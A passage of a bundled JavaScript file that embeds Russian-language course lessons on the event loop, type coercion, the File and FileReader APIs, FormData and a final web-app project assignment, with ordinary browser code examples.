выполнен до последней строчки.\nОн может вызывать сколько угодно функций, которые так же могут вызывать функции.\nПока вся эта бригада не покинет **Call Stack**, в очереди задач будут томиться другие колбеки.\n\nИтак, разница между двумя способами для функции попасть в стек вызовов:\n\n| **Прямой вызов** | **Обратный вызов** |\n| Функция будет запущена на исполнение немедленно | Колбек попадет в очередь задач |\n| Ее контекст исполнения будет в стеке вызовов одновременно с контекстом исполнения вызвавшего ее скрипта | Контекст исполнения попадет в стек вызовов, когда тот освободится |\n\n_____________________\n\n@@@@\n![](images/funcs-rule.png)\nКак мы видим, не только модель наследования, но и асинхронщина в JS держится на функциях (конструкторах).<br><br>В прототипной модели наследования рулят функции-конструкторы, а в асинхронщине - функции- колбеки.\n@@@@\n\n☼☼☼ В JS функции реально рулят! ☼☼☼\n\n___________________________________________\n\n## ![ico-25 icon] Event API\n\n@@@@ 3\nПо понятным причинам движок JS не отслеживает события.<br><br>Это делает браузер.\n![](illustrations/js-engine.png)\n^^Браузер - посредник между операционкой и движком, отслеживает события клавиатуры, мыши, системные часы и т.д.^^\n@@@@\n\nБраузер может отправлять запросы в сеть и получать ответы.\n\n@@@@\nКак "посредник", браузер предлагает программный интерфейс (**API**), который обеспечивает JS-приложению доступ к мощным возможностям браузера.<br><br>В браузере есть API для работы с событиями, и его можно назвать **Event API**.\n![](illustrations/web-api.png)\n@@@@\n\n Этот термин охватывает различные интерфейсы и методы, которые позволяют работать с событиями в веб-приложениях (более распространенные названия: **Event Handling API** или **Event Listener API**).\n\nСамый простой пример браузерного API - метод глобального объекта **~setTimeout~**.\nС его помощью мы передаем браузеру коллбек и указываем, через сколько миллисекунд этот коллбек должен попасть в очередь задач.\nДальше движок "умывает руки", потому что события отслеживает браузер. Таймер установлен, и браузер своевременно сообщит движку о том, что время истекло.\nПо истечении времени коллбек таймера будет помещён в очередь задач.\nНе факт, что он попадет в стек вызовов достаточно быстро.\nВ очереди задач может быть много колбеков, и колбеку таймера придется ждать своей очереди.\nИз очереди задач движок вытянет этот коллбек, когда наступит его очередь и стек вызовов будет свободен.\n\n◘◘![ico-20 cap] ** 1**◘◘\n~~~js\nconst start = Date.now()\nconst timer = (time = 0) => setTimeout(() => console.log(Date.now() - start), time)\nlet counter = 0\ndo {\n  timer(500)\n} while (counter++ < 10000)\n~~~\n\n{{{event-loop-01.js}}}\n\nОбратите внимание, что все таймеры были установлены на 500 милисекунд.\nОднако большое число колбеков таймеров в очереди задач привело к тому, что задежка запуска очередного колбека возростала по мере продвижения очереди задач, и в конечном итоге последний колбек вошел в стек вызовов не через 500 милисекунд, а значительно позже.\n\n__________________________________________\n\n## ![ico-25 icon] Блокирующие операции\n\n![ico-20 warn] **"Тяжелые" таски блокируют перерисовку страницы браузером и делают страницу не интерактивной, т.е. не реагирующей на действия пользователя.**\n"Тяжелый" таск - это таск, который надолго займет колстек и может серьезно задержать выполнение других задач в очереди, которые имели несчастье попасть туда после него...\n\n@@@@\n![](illustrations/event-loop-queue.png)\n^^Это похоже на очередь к врачу в тупой совковой системе.<br>У вас таллон на 14:00, уже 15:25 и перед вами в очереди еще 5 человек.<br>^^\n^^О чем это говорит?<br>О том, что код напилен крайне хреново.^^\n^^<br>Да, совок был хреново напиленным кодом.^^\n@@@@\n\nПишите код так, чтобы стек вызовов не был занят надолго.\nИначе ваша страница перестанет реагировать на события, потому что коллбеки не смогут попасть в стек вызовов.\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nfunction message (text) {\n  document.body.innerHTML += `<small>${text}</small><br>`\n}\n\nlet start = new Date().getTime()\n\nsetTimeout(() => message(`Timer real time: ${new Date().getTime()-start} ms` ), 0)\n\nfor (var x = 0; x < 1000000000; x++) continue\n\nmessage(\'Loop \\\'for\\\' finished\')\n~~~\n\nВ этом примере таймер был установлен на задержку 0 сек.\nПосмотрите, что получилось\n\n{{{Event-Loop-1.js}}}\n\n__________________________________________________________\n\nОбъявим вспомогательные функции **~createFigure~** и **~message~**:\n\n◘◘![ico-20 cap] **createFigure**◘◘\n~~~js\nfunction createFigure () {\n  const figure = section\n    .appendChild(document.createElement(\'div\'))\n  return Object.assign(figure, {\n    style: `\n      position: absolute;\n      top: 108px;\n      left: 48px;\n      width: 100px;\n      height: 100px;\n      border-radius: 4px;\n      background: #fa0;\n    `,\n    move () {\n      const { left } = figure.style\n      Object.assign(figure.style, {\n        left: parseInt(left) + 2 + \'px\'\n      })\n      Date.now() - start < 5000 && requestAnimationFrame(figure.move)\n    }\n  })\n}\n~~~\n\n◘◘![ico-20 cap] **message**◘◘\n~~~js\nfunction message (text) {\n  document.body\n    .appendChild(document.createElement(\'p\'))\n    .innerHTML = `${Date.now() - start}: ${text}`\n}\n~~~\n\nчтобы использовать ее в следующих примерах.\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst start = Date.now()\n\nconst figure = createFigure()\n\nmessage(\'Well, you\\\'re screwed, kid, now wait for the cycle to complete....\')\n\nfigure.move()\n\nsetTimeout(function () {\n  message(\'<b>Loop started</b>\')\n  for (var counter = 0; counter < 10000000000; counter++) continue\n  message(\'<b>Loop finished</b>\')\n}, 0)\n~~~\n\n{{{Event-Loop-3.js}}}\n\nТаск, запущенный таймером, занимает стек вызовов и блокирует даже перерисовку страницы и вывод сообщений в консоль.\n\nСделайте вывод из этого примера, и тогда вы поймете, почему мы не можем создавать модальные окна.\nБраузер работает в многопоточном режиме, и каждый поток имеет свой стек вызовов, поэтому для него модальные окна не проблема.\nНо у нас всего один стек вызовов.\n\n____________________________________\n\nИсправим ситуацию:\n\n◘◘![ico-20 cap] ** 4**◘◘\n~~~js\nconst section = document.body\n\nconst start = Date.now()\n\nconst figure = createFigure()\n\nfigure.move()\n\nconst recurse = (counter => {\n  message(\'<b>Loop started</b>\')\n  return function () {\n    if (counter-- > 0) setTimeout(recurse)\n    else message(\'<b>Loop finished</b>\')\n  }\n})(1000)\n\nrecurse()\n~~~\n\n{{{Event-Loop-4.js}}}\n\nКак видите, цикл работает как будто "в фоновом режиме", не блокируя перерисовку экрана и другие операции.\nОднако "фоновый режим" у нас невозможен, поскольку JS - однопоточный, с одним стеком вызовов.\nПоэтому мы имитируем "многопоточность" с помощью **Event Loop**.\n\nПозже мы познакомимся с асинхронными генераторами, которые делают нечто подобное.\n______________________________\n\n## ![ico-25 icon] Microtask\n\n☼☼☼ Мікротаски - це нахабні хлопці, які лізуть позачергово ☼☼☼\n\nКолбеки таймеров и обработчики событий UI - это таски (tasks).\n\nНо у нас есть еще "магические коробки с двумя дырками" - промисы.\nМетод **~then~** промиса тоже принимает колбек.\nИ тут в цикле событий происходят вот такие чудеса:\n\n◘◘![ico-20 cap] ** 5**◘◘\n~~~js\nconst start = Date.now()\n\nfunction message (text) {\n  document.body.innerHTML += `<p>${Date.now() - start}: ${text}</p>`\n}\n\nconst promise = text => new Promise(resolve => resolve(text))\n\nmessage(\'Start\')\n\nsetTimeout(message.bind(null, \'First macrotask\'))\nsetTimeout(message.bind(null, \'Second macrotask\'))\nsetTimeout(message.bind(null, \'Third macrotask\'))\n\npromise(\'First microtask\').then(message)\npromise(\'Second microtask\').then(message)\npromise(\'Third microtask\').then(message)\n~~~\n\n{{{event-loop-microtask.js}}}\n\nКолбеки таймеров попадают в очередь задач раноше, чем колбеки промисов (у таймеров не установлено время, т.е. по умочанию это 0).\nТак почему колбеки промисов попадают в стек вызовов раньше?\n\nПотому, что колбеки промисов - это **микротаски**, и у них своя отдельная очередь.\n\nКогда стек вызовов освобождается, то движок просматривает сначала очередь микротасков.\nЕсли там есть колбеки, то они будут один за одним отправляться в стек вызовов, пока очередь микротасков не опустеет.\nТолько тогда движок перейдет к очереди тасков.\n\nПока таски сидят в и ожидают своей очереди, чтобы попасть в Call Stack, шустрые микротаски проскакивают туда у них под носом ![ico-25 smile]\n\n![](illustrations/event-loop-micro-task.gif)\n\n☼☼☼ Микротаски - это нахальные ребята, которые лезут в Call Stack без очереди ☼☼☼\n\n________________________________________\n\nКак только мы запускаем скрипт на исполнение, мы стартуем таск.\n\nВ следующем примере это вызов функции **message**, установка таймеров и обработчика события ~click~ на _document.body_.\n\nКроме того, мы запускаем три асинхронных операции, используя **Fetch API** браузера.\n\nМы в курсе, что метод **~fetch()~** возвращает промис.\n\nКолбэк, передаваемый методу **~then()~** промиса, является **микро-таском**.\n\nА у микро-тасков своя очередь, которая имеет более высокий приоритет и обслуживается раньше, чем очередь тасков.\nТаким образом, как только стек вызовов освободится, поочередно будут выполнены все колбеки, которые уже попали в очередь микротасков к этому моменту.\nИ только потом будут выполняться колбеки из очереди тасков.\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst start = Date.now()\n\nfunction message (text) {\n  document.body.innerHTML += `<p>${Date.now() - start}: ${text}</p>`\n}\n\nconst timer = ms => setTimeout(() => setTimeout(message.bind(null, `timeout ${ms}`), 0), ms)\n\nfunction getUser () {\n  const since = Math.round(Math.random() * 20000)\n  const index = Math.round(Math.random() * 30)\n  return fetch(`https://api.github.com/users?since=${since}`)\n    .then(response => response.json())\n    .then(users => message(`github user ${since + index}: ${users[index].login}`))\n}\n\nmessage(\'start\')\n\ntimer(1000)\ntimer(500)\ntimer(400)\ntimer(200)\n\ngetUser()\ngetUser()\ngetUser()\n~~~\n\n{{{Event-Loop-6.js}}}\n\nВ этом примере, посылая **~fetch()~**-запрос на сервер, мы получаем промис, и передаем методу **~then()~** этого промиса микротаск, который получает экземпляр конструктора **Response**, который нужно распарсить методом **~json()~**, чтобы получить содержимое ~body~.\nМетод **~json()~** опять возвращает промис, методу **~then()~** которого мы передаем второй микротаск, который уже получит содержимое ответа сервера.\nТаким образом, сначала в очередь микротасков попадет первый колбек, и только после того, как он "отработает", в очередь микротасков будет отправлен второй колбек.\n\nЕсли бы мы отправили методом **~setTimeout()~** только один колбек в очередь тасков, то все колбеки таймеров попали бы в стек вызовов раньше, чем последний микротаск попал бы в очередь микротасков.\n\nЧтобы "уравнять шансы" тасков и микротасков, колбек таймера опять устанавливает таймер. Тогда в очереди тасков ситуация будет схожая с очередью микротасков.\n\n________________________________________________\n'},67556:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Приведение типов\n\n______________________________________\n\n## ![ico-25] Явное приведение типов\n\nСамый простой способ явного приведения данных произвольного типа к типу ~string~, ~number~ или ~boolean~ - использование встроенных одноименных функций **~String()~**,  **~Number()~**,  **~Boolean()~**\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar x = '10'\nNumber(x)    // 10\n~~~\n\nвернет число 10\n\n![ico-25 cap] ** 2 **\n\n~~~js\nNumber('туман')\n~~~\n\nвернет специальное значение  **~NaN~** (^^_Not  a  Number_^^),\n\nчто означает, что строка \"туман\" не может быть преобразована к числу\n\n![ico-25 cap] ** 3**\n\n~~~js\nString(50)   // \"50\"\n~~~\n\nвернет строку \"50\"\n\n![ico-25 cap] ** 4 **\n\n~~~js\nBoolean('50')  // true\n~~~\n\nвернет логическое значение  ~true~\n\n___________________________________________________________________\n\n### ![ico-20 icon] Явное приведение к ~number~\n\n![ico-20 warn] Во всех нижеперечисленных случаях результат будет ** 0**:\n\n~~~js\nNumber(null)    // 0\nNumber(false)   // 0\nNumber('')      // 0\nNumber(' ')     // 0\nNumber([])      // 0\nNumber('\\n')    // 0\nNumber('\\t')    // 0\n~~~\n\n^^\"пробельные\" символы ~\"\"~, ~\"   \"~, ~\"\\n\"~, ~\"\\t\"~ всегда приводятся к 0^^\n\n~~~js\nNumber(String.fromCharCode(9))   // 0\nNumber(String.fromCharCode(10))  // 0\nNumber(String.fromCharCode(11))  // 0\nNumber(String.fromCharCode(12))  // 0\nNumber(String.fromCharCode(13))  // 0\n~~~\n\n^^~String.fromCharCode(cod)~ возвращает символ, код которого равен **cod**^^\n\n![ico-20 warn] ~Number(true)~  вернет 1\n\n![ico-20 warn] В случаях, когда преобразовать выражение к числу невозможно, результат будет  **~NaN~** (^^Not a Number^^):\n\n![ico-25 cap] ** 5 **\n\n~~~js\nNumber(undefined)   // NaN\nNumber(' 12s ')     // NaN\nNumber('4+8')       // NaN\nNumber([5, 7, 4])   // NaN\nNumber(NaN)         // NaN\nNumber({})          // NaN\n~~~\n\n![ico-20 warn]  Во всех остальных случаях результат будет  числом\n\n![ico-25 cap] ** 6 **\n\n~~~js\nNumber(57)            // вернет 57\nNumber(4 * '8')       // вернет 32\nNumber([5])           // вернет 5\nNumber([5] + [8])     // вернет 58\nNumber(null - true)   // вернет -1\n~~~\n\n______________________________\n\n#### ![ico-20 icon] parseInt & parseFloat\n\nДля приведения к целому числу или к числу с плавающей запятой (с десятичными знаками) можно использовать встроенные функции ~parseInt~ и ~parseFloat~.\nВ отличие от конструктора **~Number~**, эти функции парсят строку, даже если в ней есть \"левые\" символы после числа - эти символы просто будут проигнорированы:\n\n~~~js\nNumber('3.14abc')      // NaN\nparseFloat('3.14abc')  // 3.14\nparseInt('3.14abc')    // 3\n\nNumber('3.14/5')        // NaN\nparseFloat('3.14/5')    // 3.14\n~~~\n\nОднако если строка начинается с символов, которые не могут быть приведены к числу, эти функции вернут **~NaN~**.\n\n____________________________________________________________________\n\n### ![ico-20 icon] Явное приведение к ~boolean~\n\n![ico-20 warn] Во всех нижеперечисленных случаях результат будет  ~false~:\n\n~~~js\nBoolean('')\nBoolean(0)     \nBoolean(-0)  \nBoolean(NaN)\nBoolean(null)\nBoolean(undefined)\nBoolean(false)\n~~~\n\n![ico-20 warn] Во всех остальных случаях результат будет  ~true~\n\nПри приведении строки к булевому типу действует простое правило:\n\nесли длина строки равна 0, то возвращается ~false~, в противном случае - ~true~\n\n____________________________________________________________________\n\n### ![ico-20 icon] Явное приведение к ~string~\n\n\n~~~js\nvar str = String(5 + 8 + false)  //  \"13\"\n\nvar object = {}\nString(object)  //  \"[object Object]\"\n\nvar array = [5, true, 'hello', 11]\nString(array)  //  \"5,true,hello,11\"\n~~~\n\nПри приведении числа к типу ~string~ можно использовать метод **_~toString()~_**, который принимает один аргумент - десятичное число 2, 8 или 16 (система исчисления).\n^^Десятичная система исчисления подразумевается по умолчанию, поэтому аргумент при этом можно опустить.^^\n^^Для того, чтобы получить строчное значение числа в двоичной системе исчисления, нужно передать методу **_~toString()~_** аргумент 2, в восьмеричной - 8, в шестнадцатеричной - 16.^^\n\n~~~js\nNumber(2).toString(2)    // \"10\"\nNumber(58).toString(2)   // \"111010\"\nNumber(8).toString(8)    // \"10\"\nNumber(58).toString(8)   // \"72\"\nNumber(16).toString(16)  // \"10\"\nNumber(58).toString(16)  // \"3a\"\n~~~\n\n____________________________________________________________________\n\n### ![ico20] Явное приведение к ~object~\n\n~~~js\nObject(5 + 8 + false)\n~~~\n\n~~~console\n▼ Number {13}\n  ► __proto__: Number\n    [[PrimitiveValue]]: 13\n~~~\n\n~~~js\nvar num = 10\nObject(num)\n~~~\n\n~~~console\n▼ Number {10}\n  ► __proto__: Number\n    [[PrimitiveValue]]: 10\n~~~\n\n~~~js\nvar array = [5, true, 'hello', 11]\nObject(array)\n~~~\n\nПреобразования не будет, поскольку тип данных переменной ** y** уже ~object~\n\n____________________________________________________________________\n\n[![ico-30 hw] **Упражнения**](external/explicit-type-covertion)\n\n____________________________________________________________________\n\n[![ico-20 link] ^^Infinity^^](external/w3-infinity)\n\n[![ico-20 link] ^^JavaScript Equality Table^^](external/equality-in-table)\n"},41101:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] File API\n\n**обеспечивает доступ к файлам на стороне клиента**\n^^(добавлен к DOM в HTML5)^^\n\nПриложение может попросить пользователя выбрать локальные файлы, а затем прочитать содержимое этих файлов.\n\nПосмотрим, как это можно сделать с помощью html-элемента ~&lt;input>~.\n\nВставим в разметку страницы тег:\n\n~~~html\n<input\n  type="file"\n  multiple\n  onchange="handleFiles(event)"\n/>\n~~~\n\nСозданный host-объект имеет свойство  **_~files~_**:\n\n![](illustrations/file-api-01.png)\n\nСвойство  **_~files~_**  является итерируемым объектом класса  **~FileList~**.\n\nСвойства объекта **_~files~`_** являются экземплярами класса  **~File~**.\n\nДоступ к этим свойствам реализуется по индексу:\n\n~~~js\nconst input = document.querySelector(\'input[type="file"]\')\nconsole.log(input.files[0])\n~~~\n\nУ свойств итерабельного объекта **~FileList~** есть ряд собственных свойств.\n\nСвойство **_~type~_** (строка) характеризует тип файла:\n\n• Для файлов изображений это будет "~image/jpg~" | "~image/png~" | "~image/gif~" | "~image/svg+xml~"\n• Для ~json~-файлов это будет "~application/json~"\n• Для ~js~-файлов это будет "~application/javascript~"\n• Для ~css~-файлов это будет "~text/css~"\n• Для ~html~-файлов это будет "~text/html~"\n• Для файлов c расширением ~txt~ это будет "~text/plain~"\n• Для исполняемых файлов (c расширением ~.exe~) это будет "~application/x-msdownload~"\n...\n\n!![illustrations/file-api-02.png, illustrations/file-api-03.png, illustrations/file-api-04.png]\n\nКроме того, у каждого объекта структуры **~FileList~** есть свойство **~size~**, значение которого характеризует размер файла в байтах.\n\nТакже можно узнать дату последней модификации файла (**~lastModified~**) и его имя (**~name~**).\n\n___________________________________\n\n[![ico-30 hw] Quiz](quiz/file-API)\n'},46559:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] FileReader\n\n**Конструктор**\n\nСоздает экземпляр объекта, который позволяет веб-приложению асинхронно читать содержимое файлов (объекты класса **_File_**) на компьютере пользователя или объекты класса **_Blob_**\n\n~~~js\nvar reader = new FileReader()\n~~~\n\n![ico-20 warn] Не может читать объекты класса **_~ReadableStream~_**\n\n\n^^^[Методы]\n• ~ ƒ~ **~readAsArrayBuffer()~**\n• ~ ƒ~ **~readAsBinaryString()~**\n• ~ ƒ~ **~readAsDataURL()~**\n• ~ ƒ~ **~readAsText()~**\n^^^\n\n\n^^^[Свойства]\n\n![ico-20 green-ok] **error**\n\n^^объект **DOMError** со свойствами **_name_** и **_message_**^^\n\n______________________________________\n\n![ico-20 green-ok] **readyState**\n\n\n• ^^**EMPTY**   : 0 (_данные еще не загружены_)^^\n• ^^**LOADING** : 1 (_данные загружаются_)^^\n• ^^**DONE**    : 2 (_операция чтения завершена_)^^\n\n______________________________________\n\n![ico-20 green-ok] **result**\n\n^^данные^^\n^^• значение свойства result определено только после завершения операции чтения^^\n^^• формат данных зависит от способа, с помощью которого процесс был вызван^^\n\n^^^\n\n^^^[Обработка событий]\n\n\n![ico-20 green-ok] onabort\n![ico-20 green-ok] onerror\n![ico-20 green-ok] onload\n![ico-20 green-ok] onloadend\n![ico-20 green-ok] onloadstart\n![ico-20 green-ok] onprogress\n\n^^^\n\nРазберите работу кода в Chrome DevTools:\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst selector = document.body.appendChild(document.createElement('input'))\nselector.type = 'file'\n\nselector.onchange = function handleFiles (event) {\n  fileReader.readAsDataURL(event.target.files[0])\n  fileReader.onload = function (event) {\n    picture.src = event.target.result\n  }\n}\n\nvar picture = document.body.appendChild(document.createElement('img'))\n\nvar fileReader = new FileReader()\n~~~\n\nСравните с уже знакомым методом  **URL.createObjectURL**:\n\n~~~js\npicture.src = URL.createObjectURL(selected)\n~~~\n\n____________________________________________________________\n\nРазберите работу кода в Chrome DevTools:\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst selector = document.body\n  .appendChild(document.createElement('input'))\n\nconst [picture, header, demo] = ['img', 'h3', 'pre']\n  .map(tagName => document.body.appendChild(document.createElement(tagName)))\n\nconst defauls = {\n  method: 'readAsArrayBuffer',\n  element: console,\n  prop: 'log'\n}\n\nselector.type = 'file'\n\nconst types = {\n  image: {\n    method: 'readAsDataURL',\n    element: picture,\n    prop: 'src'\n  },\n  text: {\n    method: 'readAsText',\n    element: demo,\n    prop: 'innerText'\n  },\n  application: {\n    method: 'readAsText',\n    element: demo,\n    prop: 'innerText'\n  }\n}\n\nselector.onchange = function handleFiles (event) {\n  const selected = event.target.files[0]\n  header.innerText = selected.type\n  const type = selected.type.split('/')[0]\n\n  const { method, element, prop } = Object.keys(types).includes(type)\n    ? types[type]\n    : defauls\n\n  fileReader[method](selected)\n  fileReader.onload = function (event) {\n    typeof element[prop] === 'function'\n      ? element[prop](event.target.result)\n      : Object.assign(element, { [prop]: event.target.result })\n  }\n}\n\nconst fileReader = new FileReader()\n~~~\n\n_____________________________________________________\n\nРазберите работу кода в Chrome DevTools:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst selector = document.body\n  .appendChild(document.createElement('input'))\n\nObject.assign(selector, {\n  type: 'file',\n  multiple: true,\n  id: 'selectImages',\n  style: 'display: none'\n})\n\nconst label = document.body\n  .appendChild(document.createElement('label'))\n\nObject.assign(label, {\n  htmlFor: 'selectImages',\n  innerText: 'Select images'\n})\n\nselector.onchange = function (event) {\n  for (const file of event.target.files) {\n    if (file.type.split('/')[0] !== 'image') continue\n\n    const picture = document.body\n      .appendChild(document.createElement('img'))\n\n    const fileReader = new FileReader()\n    fileReader.onload = (image => function (e) {\n      image.src = e.target.result\n    })(picture)\n\n    fileReader.readAsDataURL(file)\n  }\n}\n~~~\n"},98152:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Финальный проект\n\n## ![ico-25 hw] Задание\n\n### ![ico-20 sand-watch] Спринт 1\n\n![ico-20 green-ok] Сверстать главную страницу по выбранному psd-макету\n^^основной контент главной страницы должен быть веб-компонентом, который можно заменить другим веб-компонентом для имитации межстраничных переходов^^\n![ico-20 green-ok] Сверстать панель навигации\n![ico-20 green-ok] Сверстать веб-компоненты, отображаемые при переходах пользователя по "страницам" приложения\n![ico-20 green-ok] Обеспечить отображение соответствующего компонента при выборе соответствующего пункта в панели навигации\n\n### ![ico-20 sand-watch] Спринт 2\n\n![ico-20 green-ok] Установить _json-server_\n![ico-20 green-ok] Создать базу данных зарегистрированных пользователей\n![ico-20 green-ok] Создать веб-компонент **register-user** регистрации пользователя\n^^Форма регистрации должна содержать кнопку для загрузки аватара пользователя^^\n^^• при загрузке изображения должен проверяться тип файла ( это должен быть только файл изображения ), а так же его размер^^\n^^• в случае, если пользователь выбрал файл, не являющийся изображением, должно выводиться предупреждение^^\n^^• в случае, если размер изображения превышает 300 Кбайт, должно выводиться предупреждение^^\n^^• если тип файла и размер изображения отвечают требованиям, аватар загружается и отображается в форме регистрации^^\n\n^^**При регистрации нового пользователя**^^\n^^• аватар кодируется строкой Base64^^\n^^• пароль хешируется^^\n^^• данные сохраняются в базе данных^^\n^^• данные для аутентификации пользователя сохраняются в куки^^\n\n^^веб-компонент должен удаляться при клике на кнопке ✖ или кнопке "Зарегистрировать" ( стиль кнопок должен быть согласован с макетом страницы )^^\n^^если в куки-файле уже есть данные пользователя, форма заполняется этими данными ( кроме пароля )^^\n\n_________________________________________________________\n\n### ![ico-20 sand-watch] Спринт 3\n\n![ico-20 green-ok] Создать веб-компонент **user-sign-in** аутентификации зарегистрированного пользователя посредством ввода логина и пароля\n![ico-20 green-ok] Вставить код, запускаемый сразу после загрузки главной страницы\n^^• Код должен читать куки ( если они есть ), и проверять, что такой пользователь зарегистрирован в базе данных^^\n^^• Если пользователь зарегистрирован, его аватар и никнейм добавляются на главную страницу^^\n^^• Если пользователь не зарегистрирован ( куки отстутствуют или пользователь не обнаружен в базе данных ), то на главной странице должны отображаться кнопки "Регистрация" и "Вход"^^\n^^• Обработчик события click кнопки "Регистрация" должен отображать веб-компонент **register-user**^^\n^^• Обработчик события click кнопки "Вход" должен отображать веб-компонент **user-sign-in**^^\n\n### ![ico-20 sand-watch] Спринт 4\n\nНапилить код, логирующий действия пользователя\n^^• лог должен сохраняться в localStorage^^\n^^• в логе должна быть как минимум информация о последней посещенной пользователем "странице"^^\n^^• после аутентификации пользователя должен происходить переход на последнюю посещенную им страницу^^\n\n### ![ico-20 sand-watch] Спринт 5\n\n( дополнительно для тех, кто круто успевает )\n\n![ico-20 green-ok] Создать базу данных товаров / услуг / маршрутов ( путешествий ) / картинок (портфолио, галерея ) / рецептов / дел ( todo-list )...\n![ico-20 green-ok] Создать веб-компонент, отображающий контент этой базы данных\n![ico-20 green-ok] Создать веб-компонент **admin-panel**\n^^В админке можно добавлять / удалять / редактировать контент базы данных ( список товаров / услуг / картинок...^^\n\n_____________________________________________________________________\n\n### ![art] Варианты psd-макетов\n\n@@@@\n    [![maket-01]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/Olios_Template.zip)\n    [![maket-02]](http://psd-html-css.ru/sites/default/files/public/upload/template-files/piroll.zip)\n    [![maket-03]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/StockPhotosWebsite.rar)\n    [![maket-04]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/Gallaria-FreeBlogTemplateDesign.rar)\n    [![maket-05]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/ProfessionalWebsiteTemplateleo.rar)\n    [![maket-06]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/FreeOnlineShopWebsiteTemplatePSD.zip)\n    [![maket-07]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/Portal_UI.psd.zip)\n    [![maket-08]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/BeautifulTravelandHotel.rar)\n    [![maket-09]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/Marcy-free-peronal-blog-psd-template.zip)\n    [![maket-10]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/freelancer232.zip)\n    [![maket-11]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/THEYALOW.rar)\n    [![maket-12]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/BWTemplate.zip)\n    [![maket-13]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/SinglePageWebsite.rar)\n    [![maket-14]](http://psd-html-css.ru/sites/default/files/public/upload/template-files/alexis.zip)\n    [![maket-15]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/Boostfolia.zip)\n    [![maket-16]](http://psd-html-css.ru/sites/default/files/public/old/rar_files/PinballResponsiveGridStyleBlogPSD.rar)\n@@@@\n'},4480:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] FormData\n\nОбъекты класса **FormData** предоставляют интефейс для манипулирования данными форм и могут быть отправлены на сервер с помощью ~XMLHttpRequest~ или ~Fetch API~\n\n_______________________________________\n\n## ![ico-25 icon] Конструктор\n\nКонструктор FormData() создает объект класса **_FormData_**\n\n~~~js\nconst formData = new FormData()\nformData instanceof FormData   // true\n~~~\n\n~~~~console\n▼ FormData {}\n  ▼ __proto__: FormData\n      ► append: ƒ append()\n      ► delete: ƒ delete()\n      ► entries: ƒ entries()\n      ► forEach: ƒ forEach()\n      ► get: ƒ ()\n      ► getAll: ƒ getAll()\n      ► has: ƒ has()\n      ► keys: ƒ keys()\n      ► set: ƒ ()\n      ► values: ƒ values()\n      ► constructor: ƒ FormData()\n      ► Symbol(Symbol.iterator): ƒ entries()\n        Symbol(Symbol.toStringTag): \"FormData\"\n      ► __proto__: Object\n~~~~\n\nОбратие внимание, что у экземпляра FormData есть ряд унаследованных методов:\n~append~, ~delete~, ~entries~, ~forEach~, ~get~, ~getAll~, ~has~, ~keys~, ~set~ и ~values~\n\nЭти методы обеспечивают интерфейс для доступа к данным\n_____________________________________\n\n## ![ico-25 icon] Работа с формами\n\nСобрать данные из формы в экземпляр класса _FormData_ очень легко - достаточно при создании экземпляра передать конструктору ~FormData()~ в качестве аргумента ссылку на элемент формы\n\n![ico-20 warn] Следует помнить, что конструктор будет собирать в объект класса ~FormData~ из указанной формы только значения свойства ~value~ тех элементов, у которых указан атрибут **~name~**\n\n![ico-25 cap] ** 1**\n\n~~~~html\n<head>\n  <script src=\"https://cdn.rawgit.com/chrisveness/crypto/4e93a4d/sha256.js\"><\/script>\n</head>\n<body>\n  <section id=\"registration-section\">\n    <form id=\"registration-form\">\n      <input\n        name=\"user-name\"\n        placeholder=\"Enter your name\"\n      />\n\n      <input\n        type=\"password\"\n        id=\"pass-1\"\n        placeholder=\"Set your password\"\n        style=\"color: red;\"\n      />\n\n      <input\n        type=\"password\"\n        id=\"pass-2\"\n        placeholder=\"Repeat your password\"\n        disabled=\"\"\n      />\n\n      <input\n        type=\"hidden\"\n        value=\"\"\n        name=\"pass-hash\"\n      />\n\n      <input\n        type=\"hidden\"\n        value=\"\"\n        name=\"user-photo\"\n      />\n\n      <input\n        type=\"file\"\n        name=\"file\"\n        id=\"upload-avatar\"\n        style=\"visibility: hidden; width: 0\"\n      />\n\n      <label for=\"upload-avatar\">\n        <img\n          id=\"user-avatar-preview\"\n          src=\"https://www.pngitem.com/pimgs/m/440-4407257_class-dojo-cool-avatars-clipart-png-download-new.png\"\n          width=\"80\"\n        />\n      </label>\n    </form>\n    <button id=\"register-button\">Register</button>\n  </section>\n  <section id=\"user-info\">\n    <h4 id=\"user-info-name\"></h4>\n    <img id=\"user-info-avatar\" src=null width=\"80\">\n  </section>\n</body>\n~~~~\n\n~~~~js\nlet currentUser = null\n\nconst [password, passwordCheck, upload, avatar, submit, form, registration, userInfo, userInfoName, userInfoAvatar] = [\n  'pass-1',\n  'pass-2',\n  'upload-avatar',\n  'user-avatar-preview',\n  'register-button',\n  'registration-form',\n  'registration-section',\n  'user-info',\n  'user-info-name',\n  'user-info-avatar'\n].map(id => document.getElementById(id))\n\nconst [userName, passwordHash, photo] = [\n  'user-name',\n  'pass-hash',\n  'user-photo'\n].map(name => document.getElementsByName(name)[0])\n\nuserInfo.style.display = 'none'\n\nupload.onchange = function (event) {\n  const photo = event.target.files[0]\n  if (photo.type.indexOf('image') !== 0) return\n  const picture = URL.createObjectURL(photo)\n  